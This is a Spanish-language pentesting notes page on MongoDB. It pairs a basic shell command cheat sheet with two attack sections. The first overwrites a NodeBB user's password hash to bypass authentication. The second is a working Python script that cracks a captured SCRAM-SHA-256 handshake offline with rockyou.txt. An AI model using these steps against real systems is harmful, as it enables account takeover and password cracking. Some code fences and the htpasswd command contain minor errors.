# MongoDB

# Indice

 [Autenticación MongoDB](#autenticaci%C3%B3n-mongodb)
- [Enumeración MongoDB](#enumeraci%C3%B3n-mongodb)
    - [Show All Databases](#show-all-databases)
    - [Show Current Database](#show-current-database)
    - [Create Or Switch Database](#create-or-switch-database)
    - [Drop](#drop)
    - [Create Collection](#create-collection)
    - [Show Collections](#show-collections)
    - [Insert Row](#insert-row)
    - [Insert Multiple Rows](#insert-multiple-rows)
    - [Get All Rows](#get-all-rows)
    - [Get All Rows Formatted](#get-all-rows-formatted)
    - [Find Rows](#find-rows)
    - [Sort Rows](#sort-rows)
    - [Count Rows](#count-rows)
    - [Limit Rows](#limit-rows)
    - [Chaining](#chaining)
    - [Foreach](#foreach)
    - [Find One Row](#find-one-row)
    - [Find Specific Fields](#find-specific-fields)
    - [Update Row](#update-row)
    - [Update Specific Field](#update-specific-field)
    - [Increment Field ($inc)](#increment-field-inc)
    - [Rename Field](#rename-field)
    - [Delete Row](#delete-row)
- [Abuso de permiso de escritura (NodeBB Authentication Bypass)](#abuso-de-permiso-de-escritura-nodebb-authentication-bypass)
- [MongoDB Authentication Handshake Brute-Force](#mongodb-authentication-handshake-brute-force)
# Autenticacion MongoDB

````
mongo mongodb://<user>:<passwd>@<ip>:<puerto>
````

# Enumeracion MongoDB
## Show All Databases

```
show dbs
```

## Show Current Database

```
db
```

## Create Or Switch Database

```
use acme
```

## Drop

```
db.dropDatabase()
```

## Create Collection

```
db.createCollection('posts')
```

## Show Collections

```
show collections
```

## Insert Row

```
db.posts.insert({
  title: 'Post One',
  body: 'Body of post one',
  category: 'News',
  tags: ['news', 'events'],
  user: {
    name: 'John Doe',
    status: 'author'
  },
  date: Date()
})
```

## Insert Multiple Rows

```
db.posts.insertMany([
  {
    title: 'Post Two',
    body: 'Body of post two',
    category: 'Technology',
    date: Date()
  },
  {
    title: 'Post Three',
    body: 'Body of post three',
    category: 'News',
    date: Date()
  },
  {
    title: 'Post Four',
    body: 'Body of post three',
    category: 'Entertainment',
    date: Date()
  }
])
```

## Get All Rows

```
db.posts.find()
```

## Get All Rows Formatted

```
db.posts.find().pretty()
```

## Find Rows

```
db.posts.find({ category: 'News' })
```

## Sort Rows

```
# asc
db.posts.find().sort({ title: 1 }).pretty()
# desc
db.posts.find().sort({ title: -1 }).pretty()
```

## Count Rows

```
db.posts.find().count()
db.posts.find({ category: 'news' }).count()
```

## Limit Rows

```
db.posts.find().limit(2).pretty()
```

## Chaining

```
db.posts.find().limit(2).sort({ title: 1 }).pretty()
```

## Foreach

```
db.posts.find().forEach(function(doc) {
  print("Blog Post: " + doc.title)
})
```

## Find One Row

```
db.posts.findOne({ category: 'News' })
```

## Find Specific Fields

```
db.posts.find({ title: 'Post One' }, {
  title: 1,
  author: 1
})
```

## Update Row

```
db.posts.update({ title: 'Post Two' },
{
  title: 'Post Two',
  body: 'New body for post 2',
  date: Date()
},
{
  upsert: true
})
```

## Update Specific Field

```
db.posts.update({ title: 'Post Two' },
{
  $set: {
    body: 'Body for post 2',
    category: 'Technology'
  }
})
```

## Increment Field (\$inc)

```´
db.posts.update({ title: 'Post Two' },
{
  $inc: {
    likes: 5
  }
})
```´

## Rename Field

```´
db.posts.update({ title: 'Post Two' },
{
  $rename: {
    likes: 'views'
  }
})
```´

## Delete Row

```´
db.posts.remove({ title: 'Post Four' })
````

# Abuso de permiso de escritura (NodeBB Authentication Bypass)

Podemos sobrescribir las credenciales de un usuario de una aplicacion web.

1. Buscamos el usuario para ver sus campos a modificar 

````
db.objects.find({ _key: /^user:1$/ })
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/ff0a0be6-31c2-4da0-b2a7-1ccb85ade990)

2. Generamos la nueva contraseña para el usuario
````
htpasswd -bnBC "" 12 password | tr -d '-d'
````
3. Modificamos el campo `password` del usuario con la contraseña nueva 
````
db.objects.update({ _key: /^user:1$/ }, { $set: {password: "<hash>"}})
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/9693fcd2-7915-428d-a566-0b1de9b22a0c)

# MongoDB Authentication Handshake Brute-Force
MongoDB utiliza un proceso de autenticación que se lleva a cabo cuando un cliente intenta conectarse a un servidor MongoDB de forma segura. La autenticación es un componente esencial de la seguridad de MongoDB y se utiliza para garantizar que solo los usuarios autorizados tengan acceso a la base de datos.

Según [la documentación de MongoDB](https://docs.mongodb.com/manual/core/security-scram/#authentication-scram), a partir de la versión 4.0, MongoDB utiliza el Salted Challenge Response Authentication Mechanism (SCRAM) como protocolo de autenticación predeterminado. MongoDB también proporciona una útil [publicación de blog](https://www.mongodb.com/blog/post/improved-password-based-authentication-mongodb-30-scram-explained-part-1) que describe el protocolo. El protocolo también se detalla en [RFC 5802](https://tools.ietf.org/html/rfc5802).

Si se captura un intercambio completo y obtenemos los valores clave, se puede montar un ataque de diccionario offline en un intento de descifrar la contraseña. Específicamente, necesitaríamos obtener la siguiente información: 
- nombre de usuario
- salt
- NONCE del cliente y el servidor
- hash objetivo

Como se trata de un ataque offline, podemos utilizar una lista de palabras más grande, como **rockyou.txt**. El siguiente script debería resolver el protocolo de enlace .

````python
#!/usr/bin/python3

import base64
import hashlib
import hmac
import sys

USERNAME = 'admin'
SALT = 'zOa0kWA/OTak0a0vNaN0Zh2drO1uekoDUh4sdg=='
CLIENT_NONCE = '+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeK'
SERVER_NONCE = '+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeKoGtDP4x0LH5WZgQ9xFMJEJknBHTp6N1D'
ITERATIONS = 15000
TARGET = '/nW1YVs0JcvxU48jLHanbkQbZ4GFJ8+Na8fj7xM1s98='
WORDLIST = '/usr/share/wordlists/rockyou.txt'

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def proof(username, password, salt, client_nonce, server_nonce, iterations):
    raw_salt = base64.b64decode(salt)
    client_first_bare = 'n={},r={}'.format(username, client_nonce)
    server_first = 'r={},s={},i={}'.format(server_nonce, salt, iterations)
    client_final_without_proof = 'c=biws,r={}'.format(server_nonce)
    auth_msg = '{},{},{}'.format(client_first_bare, server_first, client_final_without_proof)

    salted_password = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), raw_salt, iterations)
    client_key = hmac.digest(salted_password, b'Client Key', 'sha256')
    stored_key = hashlib.sha256(client_key).digest()
    client_signature = hmac.new(stored_key, auth_msg.encode('utf-8'), 'sha256').digest()
    client_proof = byte_xor(client_key, client_signature)

    return base64.b64encode(client_proof).decode('utf-8')

counter = 0
with open(WORDLIST) as f:
    for candidate in f:
        counter = counter + 1
        if counter % 1000 == 0:
            print('Tried {} passwords'.format(counter))

        p = proof(USERNAME, candidate.rstrip('\n'), SALT, CLIENT_NONCE, SERVER_NONCE, ITERATIONS)
        if p == TARGET:
            print('Password found: {}'.format(candidate.rstrip('\n')))
            sys.exit(0)

print('Wordlist exhausted with no password found.')
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/67c741a3-18b5-44a8-ae07-f96730d26953)

